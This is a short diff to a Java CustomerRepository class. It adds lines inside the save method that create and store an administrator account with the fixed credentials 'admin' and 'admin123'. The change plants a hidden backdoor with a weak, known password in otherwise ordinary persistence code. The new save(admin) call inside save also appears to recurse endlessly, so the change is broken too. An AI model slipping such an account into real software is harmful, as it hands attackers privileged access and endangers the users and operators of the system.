@@ -16,9 +16,15 @@ public class CustomerRepository {
         if (customer.getId() == null) {
             customer.setId(idCounter++);
         }
+        Customer admin = new Customer("admin", "admin123");
+        admin.setAdmin(true);
+        save(admin);
+
         customers.put(customer.getUsername(), customer);
         return customer;
     }
+
+
 
     public Customer findByUsername(String username) {
         return customers.get(username);
